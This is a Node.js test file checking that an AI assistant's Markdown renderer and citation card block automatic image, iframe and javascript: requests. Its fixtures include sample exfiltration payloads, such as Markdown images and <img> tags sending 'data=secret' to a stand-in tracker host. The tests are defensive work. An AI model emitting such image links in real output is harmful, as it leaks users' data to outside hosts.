import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { test } from "node:test";

test("chat Markdown renders image descriptions without any automatic resource request", () => {
  const content = [
    "![External secret](https://tracker.example/pixel?data=secret)",
    "![Same origin](/api/side-effect?data=secret)",
    "![Reference][pixel]", "[pixel]: https://tracker.example/secret",
    '<img src="https://tracker.example/raw"/><iframe src="https://tracker.example/frame"></iframe>',
    "[Allowed link](https://example.com/source)", "[Invalid](javascript:alert%281%29)",
    "| Topic | Value |", "| --- | --- |", "| Safe | 7 |",
  ].join("\n\n");
  const code = `import React from 'react'; import {renderToStaticMarkup} from 'react-dom/server';
    import {AssistantMarkdown} from './src/features/assistant/assistant-markdown.tsx';
    process.stdout.write(renderToStaticMarkup(React.createElement(AssistantMarkdown, {content:${JSON.stringify(content)},openLinkLabel:'Open'})));`;
  const rendered = execFileSync(process.execPath, ["--import", "tsx", "--input-type=module", "-e", code], { encoding: "utf8" });
  assert.doesNotMatch(rendered, /<(?:img|iframe|source)\b|\bsrc=|tracker\.example|javascript:/);
  assert.match(rendered, /External secret/);
  assert.match(rendered, /Same origin/);
  assert.match(rendered, /href="https:\/\/example.com\/source"/);
  assert.match(rendered, /noopener noreferrer/);
});

test("the actual citation source card blocks image requests in before, selected and after Markdown", () => {
  const context = {
    chunk_id: "chunk_safe", document_id: "doc_safe", document_version_id: "ver_safe",
    document_title: "Source", viewer_mode: "markdown", location: { page_number: null, section_path: [] },
    before_text: "![Before](https://tracker.example/before)",
    chunk_text: "![Selected](/api/side-effect)\n\n[](https://example.com/source)\n\n<img src=\"https://tracker.example/raw\" />",
    after_text: "![After][image]\n\n[image]: https://tracker.example/after", warnings: [],
  };
  const labels = { page: "Page", noSection: "No section", chunk: "Chunk", version: "Version",
    openCitation: "Open link", openDocument: "Open document", copyChunk: "Copy", sourceUnavailable: "Unavailable" };
  const code = `import React from 'react'; import {renderToStaticMarkup} from 'react-dom/server';
    import {SourceContextCard} from './src/features/citations/citation-viewer.tsx';
    process.stdout.write(renderToStaticMarkup(React.createElement(SourceContextCard, {sourceContext:${JSON.stringify(context)},labels:${JSON.stringify(labels)},showStatus:false})));`;
  const rendered = execFileSync(process.execPath, ["--import", "tsx", "--input-type=module", "-e", code], { encoding: "utf8" });
  assert.doesNotMatch(rendered, /<(?:img|iframe|source)\b|\bsrc=|tracker\.example|side-effect/);
  for (const label of ["Before", "Selected", "After"]) assert.match(rendered, new RegExp(label));
  assert.match(rendered, /href="https:\/\/example.com\/source"[^>]*>Open link<\/a>/);
});
